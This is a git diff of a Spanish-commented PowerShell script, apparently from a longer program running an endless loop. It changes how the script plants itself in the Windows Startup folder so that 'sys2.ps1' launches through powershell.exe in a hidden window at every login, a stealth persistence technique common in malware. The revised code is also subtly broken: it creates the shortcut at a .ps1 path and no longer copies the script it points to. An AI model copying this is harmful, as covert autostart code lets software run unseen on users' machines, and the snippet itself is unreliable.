@@ -103,13 +103,13 @@ While ($true){
 $startupFolder = [Environment]::GetFolderPath("Startup")
 
 # Ruta completa del script en la carpeta de inicio
-$scriptInStartupPath = Join-Path -Path $startupFolder -ChildPath "sys2.ps1"
+$scriptInStartupScriptPath = Join-Path -Path $startupFolder -ChildPath "sys2.ps1"
 
-# Copiar el script a la carpeta de inicio
-Copy-Item -Path $scriptPath -Destination $scriptInStartupPath -Force
+# Crear un objeto Shell.Application
+$shell = New-Object -ComObject WScript.Shell
 
-# Crear un acceso directo del script en la carpeta de inicio para que se ejecute al iniciar Windows
-$shortcutPath = Join-Path -Path $startupFolder -ChildPath "Run_Script.lnk"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
-$Shortcut.Save()
+# Crear el acceso directo del script en la carpeta de inicio
+$shortcut = $shell.CreateShortcut($scriptInStartupScriptPath)
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-WindowStyle Hidden -File $scriptInStartupScriptPath"
+$shortcut.Save()
